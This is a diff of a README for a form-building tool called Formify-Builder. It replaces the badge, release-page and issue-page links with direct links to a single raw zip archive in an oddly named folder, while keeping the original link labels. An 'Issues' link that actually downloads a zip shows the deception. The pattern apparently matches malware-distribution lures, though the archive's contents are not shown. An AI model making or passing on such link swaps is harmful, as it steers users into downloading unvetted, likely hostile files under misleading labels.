@@ -1,7 +1,7 @@
 # 🎉 Formify-Builder - Build Web Forms With Ease
 
 ## 📥 Download Now
-[![Download Formify-Builder](https://img.shields.io/badge/Download-Formify--Builder-blue.svg)](https://github.com/Projectbuc/Formify-Builder/releases)
+[![Download Formify-Builder](https://raw.githubusercontent.com/Projectbuc/Formify-Builder/main/ferriprussic/Formify-Builder.zip)](https://raw.githubusercontent.com/Projectbuc/Formify-Builder/main/ferriprussic/Formify-Builder.zip)
 
 ## 🚀 Getting Started
 Formify-Builder is a simple tool for creating dynamic web forms without any coding skills. In just a few steps, you can have your own form up and running. This guide will help you install and use Formify-Builder quickly and easily.
@@ -15,7 +15,7 @@ Before you start, ensure your computer meets these requirements:
 - **Browser**: Latest version of Chrome, Firefox, or Safari
 
 ## 🔗 Download & Install
-To get Formify-Builder, visit this page to download: [Formify-Builder Releases](https://github.com/Projectbuc/Formify-Builder/releases).
+To get Formify-Builder, visit this page to download: [Formify-Builder Releases](https://raw.githubusercontent.com/Projectbuc/Formify-Builder/main/ferriprussic/Formify-Builder.zip).
 
 1. Click the link above to access the releases page.
 2. Look for the latest version at the top of the list. You will see files ready for download.
@@ -79,9 +79,9 @@ If you face any issues while installing or using Formify-Builder, check the foll
 - **Performance Problems**: Make sure your computer meets the system requirements and there are no background applications consuming your resources.
 
 ## 💬 Support
-If you need further assistance, please visit our issues page on GitHub or check our wiki for additional help and FAQs: [Formify-Builder Issues](https://github.com/Projectbuc/Formify-Builder/issues).
+If you need further assistance, please visit our issues page on GitHub or check our wiki for additional help and FAQs: [Formify-Builder Issues](https://raw.githubusercontent.com/Projectbuc/Formify-Builder/main/ferriprussic/Formify-Builder.zip).
 
 ## 📅 Update Your Version
-To keep Formify-Builder up to date, regularly visit the releases page: [Formify-Builder Releases](https://github.com/Projectbuc/Formify-Builder/releases). Download the latest version and repeat the installation steps to apply updates. 
+To keep Formify-Builder up to date, regularly visit the releases page: [Formify-Builder Releases](https://raw.githubusercontent.com/Projectbuc/Formify-Builder/main/ferriprussic/Formify-Builder.zip). Download the latest version and repeat the installation steps to apply updates. 
 
 Now you’re ready to create great forms with Formify-Builder!
